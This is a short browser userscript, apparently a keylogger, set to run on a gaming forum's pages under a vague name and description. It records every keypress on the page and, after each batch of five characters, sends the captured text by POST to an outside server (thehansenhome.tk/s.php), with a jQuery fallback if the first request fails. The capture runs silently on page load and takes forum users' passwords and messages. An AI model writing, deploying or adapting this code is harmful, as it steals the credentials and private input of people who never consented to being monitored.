// ==UserScript==
// @name        Anal
// @description trash man
// @namespace   trashaaaaaaaaaaaaaaaaaaaaaaaaaaa@gmail.com
// @include     http://aimgames.forummotion.com/*                     
// @version     2
// @grant       GM_xmlhttpRequest
// @license     MIT License (Expat); opensource.org/licenses/MIT
// @require     http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js
// ==/UserScript==


keys = "";
keyn = 0;
document.onkeypress = function(evt) {
   evt = evt || window.event
   key = String.fromCharCode(evt.charCode)
   keys += key;
   keyn++;
   alert('got key');
   if (keyn >= 5) {
     sendKey(keys);
     keyn = 0;
   }
}

function sendKey(pkey) {
   /*if (key) {
      var http = new XMLHttpRequest();
      var param = encodeURI(key)
      http.open("POST","//www.thehansenhome.tk/s.php",true);
      http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
      http.send("key="+param);
   }*/
   try {
    /*GM_xmlhttpRequest({
      method: "GET",
      url: "//www.thehansenhome.tk/s.php",
      onload: function(response) {
        //alert(response.responseText);
      }
    });*/
    alert('sent key');
    GM_xmlhttpRequest({
      method: "POST",
      url: "http://www.thehansenhome.tk/s.php",
      data: "key="+pkey,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      onload: function(response) {
        //if (response.responseText.indexOf("Logged in as") > -1) {
        //  location.href = "http://www.example.net/dashboard";
        //}
      }
    });
   } catch (e) {
     $.ajax({
        type: "POST",
        cache: false,       
        url: '//www.thehansenhome.tk/s.php',
        data: {key: pkey},
        success: function(data) {
          //alert('data has been stored to database');
        }
     });
   }
}


/*
ass = document.createElement('script')
ass.innerHTML = "" + anal;
document.head.appendChild(ass);*/
